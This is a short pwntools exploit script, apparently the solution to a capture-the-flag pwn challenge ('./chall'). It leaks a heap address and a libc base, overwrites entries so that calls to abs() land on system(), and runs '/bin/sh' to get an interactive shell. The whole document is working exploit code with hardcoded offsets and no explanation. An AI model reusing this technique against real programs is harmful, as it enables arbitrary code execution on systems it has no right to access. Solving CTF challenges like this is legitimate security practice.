#!/usr/bin/python3
from pwn import process, p64

shell = process("./chall")

def register(name, description):
    shell.sendlineafter(b">> ", b"1")
    shell.sendlineafter(b"? ", b"+")
    shell.sendlineafter(b"? ", name)
    shell.sendlineafter(b"? ", description)

def view(index, final=False):
    shell.sendlineafter(b">> ", b"2")
    shell.sendlineafter(b"?", str(index).encode())
    shell.recvuntil(b"Age: ")

    if final:
        shell.interactive()
    else:
        leak = int(shell.recvline(), 10)
        return leak

register(b"A" * 8, b"A" * 8)
register(b"/bin/sh\x00", b"B" * 8)

heap_base = view(1) - 0xe0

payload = p64(heap_base + 0x28) * 4
register(b"C" * 8, payload)

register(b"D" * 8, b"D" * 8)
register(b"E" * 8, b"E" * 8)
register(b"F" * 8, b"F" * 8)

libc_base = view(5) - 0x3fa000

payload = p64(libc_base + 0x21a080) * 4 # abs()
register(b"G" * 8, payload)

payload = p64(libc_base + 0x050d70) * 4 # system()
register(b"H" * 8, payload)

view(1, True)
shell.interactive()
